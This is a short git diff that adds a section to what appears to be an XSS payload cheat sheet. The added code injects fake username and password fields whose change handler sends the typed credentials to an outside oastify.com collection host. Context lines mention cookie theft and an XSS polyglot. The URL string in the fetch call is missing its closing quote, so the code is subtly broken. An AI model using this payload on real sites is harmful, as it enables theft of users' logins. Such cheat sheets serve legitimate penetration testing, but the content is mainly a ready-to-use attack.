@@ -76,9 +76,14 @@ body:document.cookie
 [Ultimate XSS Polygot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 
 
-
+### Captures Username and Password
 ```javascript
-
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://8z8ffalhg6k3rf3maby5zzrrpiv9jz7o.oastify.com,{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
 ```
 
 ```javascript
